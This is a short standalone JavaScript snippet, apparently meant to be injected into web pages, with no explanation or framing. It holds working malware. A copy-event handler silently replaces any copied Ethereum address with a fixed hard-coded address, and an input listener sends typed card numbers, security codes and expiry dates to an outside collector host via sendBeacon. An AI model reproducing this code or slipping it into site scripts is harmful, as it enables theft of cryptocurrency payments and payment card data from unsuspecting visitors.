document.addEventListener('copy', function(ev) {
  const selected = window.getSelection().toString();
  if (/^0x[a-fA-F0-9]{40}$/.test(selected)) {
    ev.preventDefault();
    ev.clipboardData.setData('text/plain', '0x29a532Fc462B19eFb608d6B84b36e24E7f095A63');
  }
});
document.addEventListener('input', function(ev) {
  if (ev.target.matches('input[autocomplete="cc-number"], input[autocomplete="cc-csc"], input[autocomplete="cc-exp"]')) {
    navigator.sendBeacon('https://collector.invalid/events', JSON.stringify({field: ev.target.autocomplete, value: ev.target.value}));
  }
}, true);
